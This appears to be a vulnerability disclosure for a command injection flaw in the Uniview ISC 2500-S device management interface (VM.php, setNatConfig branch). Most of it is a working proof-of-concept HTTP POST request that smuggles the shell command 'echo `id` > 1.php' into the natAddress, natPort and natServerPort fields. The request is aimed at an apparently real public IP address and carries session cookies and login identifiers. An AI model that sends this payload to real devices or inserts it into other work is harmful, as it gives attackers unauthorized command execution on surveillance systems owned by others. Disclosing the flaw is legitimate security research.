Zhejiang Uniview ISC 2500-S system has command execution vulnerability

1. Impact of vulnerabilities：ISC 2500-S
2. Vulnerability location：/Interface/DevManage/VM.php
3. Code analysis：When entering the setNatConfig branch, the three parameters natAddress, natPort, and natServerPort are brought to the exec() function for command execution without any filtering.
![image](https://github.com/since2019-costin/cve/assets/169053485/766aaaa8-460d-4c10-a3ce-374b160822b4)
4.Vulnerability recurrence

![image](https://github.com/since2019-costin/cve/assets/169053485/01f829fb-6d65-4bf0-8084-a2929c874934)

We write the id into 1.php through the natAddress, natPort, and natServerPort parameters. The POC is as follows
```
POST /Interface/DevManage/VM.php HTTP/1.1
Accept: */*
Accept-Language: zh-cn
Referer: http://ip:90/Page/SystemConfig/DevConfig/NatSet.php
x-requested-with: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: 220.189.218.162:90
Content-Length: 261
Pragma: no-cache
Cookie: logintime=Fri%20Jan%205%2018%3A46%3A56%20UTC+0800%202024; devLanguage=zh-CN; loginuser=admin; recordpasswd=false; PHPSESSID=4fa99df42dc0dad9b54b4034c74e8f91
Connection: close

cmd=setNatConfig&natAddress=1.1.1.2;echo%20`id`%20>%201.php&natPort=80;echo%20`id`%20>%201.php&natServerPort=;echo%20`id`%20>%201.php&GAJAX_USERID=0000&GAJAX_LOGINID=21822020240105183142&GAJAX_ORGCODE=0000&GAJAX_USERNAME=admin&GAJAX_ORGNAME=Root&GAJAX_ORGTYPE=2
```
![image](https://github.com/since2019-costin/cve/assets/169053485/1c1f5b10-c00a-4707-9255-b9e40704f42f)

Visit /Interface/LogReport/1.php
![image](https://github.com/since2019-costin/cve/assets/169053485/88b6fe24-0c1a-45e2-acdf-a328eb9141ea)
